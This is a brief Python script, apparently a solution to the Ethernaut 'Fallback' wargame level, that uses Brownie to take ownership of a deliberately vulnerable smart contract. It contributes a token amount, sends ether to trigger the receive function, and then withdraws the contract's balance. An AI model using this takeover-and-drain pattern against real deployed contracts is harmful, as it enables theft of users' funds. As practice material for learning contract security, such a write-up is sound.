from brownie import accounts, config, interface, Fallback, web3

def main():
    contract = "0xa5580F70B6DE74672A06d6DF56464CD1c7268dc8"
    player = accounts.add(config["wallets"]["from_key"])
    print(player)

    #get fallback contract at address
    fallback=interface.IFallback(contract)



    fallback.contribute({'from': player, 'amount': '1'})

    # call 'receive'
    player.transfer(contract, amount="1")

    print(f"Owner is hacker: {fallback.owner() ==player.address}")
    fallback.withdraw({"from" : player})
    print(f"Final contract balance: {web3.eth.getBalance(contract)}")

